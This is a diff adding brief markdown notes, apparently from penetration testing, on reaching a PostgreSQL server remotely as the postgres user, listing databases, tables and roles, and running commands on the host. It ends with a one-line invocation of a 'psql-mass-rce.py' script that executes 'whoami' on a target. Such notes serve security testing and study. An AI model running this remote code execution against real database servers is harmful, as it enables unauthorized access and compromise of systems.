@@ -1,1 +1,16 @@
-
+- postgres sql
+    - Connect to the server remotely
+        > psql -h 192.168.190.60 -U postgres -W 
+        > psql -h 192.168.190.60 -U postgres -W postgres -p 5437
+    - commands
+        - List databases
+            > \list
+        - use a database
+            > \c <database name>
+        - list tables
+            > \d
+        - get users roles
+            > \du+
+    - psql cmd execution
+        > psql-mass-rce.py 192.168.91.47 --port 5437 --command "whoami"
+        
